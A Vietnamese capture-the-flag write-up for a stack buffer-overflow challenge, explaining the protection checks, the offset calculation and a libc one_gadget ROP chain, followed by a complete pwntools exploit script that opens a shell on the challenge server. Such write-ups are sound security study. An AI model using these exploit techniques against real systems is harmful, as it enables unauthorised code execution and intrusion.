# BOF

Kiểm tra các chế độ bảo vệ cơ bản của chương trình :

![image](https://user-images.githubusercontent.com/93699926/236652416-f2fc62f5-d06a-4ba4-a71c-726c908668c9.png)

Chế độ bảo vệ Canary khôg được bật, sẽ dễ dàng hơn trong việc thực hiện overflow và điều khiển luồng thực thi của chương trình

Kiểm tra luồng thực thi của chương trình trong IDA ta có như sau :

![image](https://user-images.githubusercontent.com/93699926/236652465-7beb36b4-826b-4971-ac7d-f55291919582.png)

Chương trình cho ta địa chỉ hàm SYSTEM như một món quà ,và sẽ cho ta nhập vào địa chỉ s[256] tới tận 64 byte,
rõ ràng đây là lỗi BOF . kiểm tra thông qua IDA ta có thể dễ dàng tính được offset từ s[256] tới saved rip của main là 0x28.
Vì bài bài này pie tắt và ta sẽ không thể loop lại chươg trình vì không có địa chỉ exe nên nếu ta khai thác theo hướng gọi system("/bin/sh") thì sẽ có lỗi
 khi mà địa chỉ RBP của ta không phải là địa chỉ hợp lệ . Vậy ta sẽ sử dụng one_gadget :

![image](https://user-images.githubusercontent.com/93699926/236652588-d5bce5f3-380a-4b26-b46c-425848e60942.png)

sử dụng onegadget đầu tiên, ta sẽ thêm một gadget lâys từ libc là pop rcx nữa để đảm bảo điều kiện thực thi nó 
. câu lệnh `ropper --f libc.so.6 > rop.txt ; cat rop.txt|grep pop`

vì khi chương trìn sẽ đọc vô địa chỉ s[256] 0x40 bytes. vậy 0x40-0x28=0x18(đủ chỗ cho 3 gadget lận).
==> nên payload của ta sẽ là 

```python
payload=b"A"*0x28
payload+=flat(
  pop_rcx,0,
  onegadget,
  )
```

fullscript in p.py:

```python3
from pwn import *
context.binary=exe=ELF("./unaligned",checksec=False)
libc=ELF("./libc.so.6",checksec=False)
#p=process(exe.path)
p=remote("unaligned.bsides.shellmates.club",443,ssl=True)
def GDB():
        gdb.attach(p,gdbscript=
                '''
                ni
                '''
                )
        input()



#GDB()
offest=0x28
p.recvuntil(b"Gift: ")
leak=int(p.recvline()[:-1],16)
log.info('[+]leak:'+hex(leak))
libc.address=leak-0x4f420
log.info('[+]libc base:'+hex(libc.address))
pop_rcx=libc.address+0x000000000010c423
pop_rdi=libc.address+0x000000000002164f
syscall=libc.address+0x00000000000d2625
ret=libc.address+0x00000000000008aa
pop_rsp=libc.address+0x000000000000396c
payload=b"C"*(offest)
payload+=flat(
        pop_rcx,0,
        libc.address+0x4f2a5,
        )

p.sendlineafter(b"Name: ",payload)
p.interactive()
```

chạy script:

![image](https://user-images.githubusercontent.com/93699926/236652769-28e11351-f371-439d-b282-a3f2615fa64c.png)
